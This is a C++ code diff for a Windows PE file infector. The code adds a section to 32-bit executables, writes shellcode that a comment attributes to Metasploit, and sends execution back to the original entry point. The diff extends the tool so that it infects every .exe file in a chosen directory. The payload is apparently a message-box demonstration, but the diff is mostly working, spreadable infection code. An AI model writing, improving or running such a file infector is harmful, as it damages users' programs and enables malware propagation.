@@ -1,6 +1,10 @@
 #include <windows.h>
 #include <stdio.h>
 #include <iostream>     
+#include <filesystem>
+#include <string>
+
+// This code using filesystem library, so make sure to use C++ 17 or higher
 
 using namespace std;
 
@@ -80,7 +84,7 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DW
     WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);
     SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);
 
-    // shellcode
+    // Get shellcode from Metasploit framework
     const char* shellcode1 = "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
                                 "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
                                 "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
@@ -108,12 +112,12 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DW
         cout << "Error: Fail to write file" << endl;
         return false;
     }
-    // Get entry point and use liitle endian and change to hex
+    // Get entry point and use little endian and change to hex
     for (int i = 0; i < 4; i++) {
         BYTE carrier = (BYTE)(lastEntryPoint >> (i * 8));
         WriteFile(hFile, &carrier, 1, &byteWritten, NULL);
     }
-    // Add \xc3 to the shellcode
+    // Add \xc3 to the end of shellcode, it makes shellcode run correctly
     const char* shellcode2 = "\xc3";
     WriteFile(hFile, shellcode2, 1, &byteWritten, NULL);
     if (byteWritten != 1) {
@@ -135,7 +139,7 @@ bool OpenFile(const char* fileName) {
     DWORD fileSize = GetFileSize(hFile, NULL);
     if (!fileSize) {
         CloseHandle(hFile);
-        cerr << "Error: File empty, try another one" << endl;
+        cerr << "Error: File " << fileName << " empty, try another one" << endl;
         return false;
     }
     // Buffer to allocate
@@ -144,7 +148,7 @@ bool OpenFile(const char* fileName) {
 
     // Reading the entire file to use the PE information
     if (!ReadFile(hFile, pByte, fileSize, &byteWritten, NULL)) {
-        cerr << "Error: Fail to read file" << endl;
+        cerr << "Error: Fail to read file " << fileName << endl;
     }
 
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
@@ -157,18 +161,18 @@ bool OpenFile(const char* fileName) {
     PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
     if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
         CloseHandle(hFile);
-        cerr << "Error: PE32+ detected, this version works only with PE32" << endl;
+        cerr << "Error: " << fileName << " is PE32+, this version works only with PE32" << endl;
         return false;
     }
 
     if (!CreateNewSection(hFile, pNtHeader, pByte, fileSize, byteWritten, 400)) {
-        cerr << "Error: Fail to create new section" << endl;
+        cerr << "Error: Fail to create new section into " << fileName << endl;
         return false;
     }
 
     // Insert data into the last section
     if (!InflectSection(hFile, pNtHeader, pByte, fileSize, byteWritten)) {
-        cerr << "Error: Fail to infect Message Box" << endl;
+        cerr << "Error: Fail to infect Message Box into " << fileName << endl;
         return false;
     }
 
@@ -178,15 +182,32 @@ bool OpenFile(const char* fileName) {
     return true;
 }
 
+bool OpenDirectory(const char* pathDirectory) {
+    int countFile = 0;
+    for (const auto& entry : filesystem::directory_iterator(pathDirectory)) {
+        if (entry.is_regular_file() && entry.path().extension() == ".exe") {
+            string temp = entry.path().string();
+            const char* filePath = temp.c_str();
+            OpenFile(filePath);
+        }
+        countFile++;
+    }
+
+    if (countFile == 0) {
+        return false;
+    }
+    return true;
+}
+
 int main(int argc, char* argv[]) {
 
     if (argc < 2) {
-        cout << "Usage: " << argv[0] << " <path\\of\\file>" << endl;
+        cout << "Usage: " << argv[0] << " <path\\of\\directory\\>" << endl;
         return 1;
     }
-
-    if (!OpenFile(argv[1])) {
-        cerr << "Error: Invalid file path" << endl;
+    
+    if (!OpenDirectory(argv[1])) {
+        cerr << "Error: Invalid or empty directory" << endl;
     }
 
     return 0;
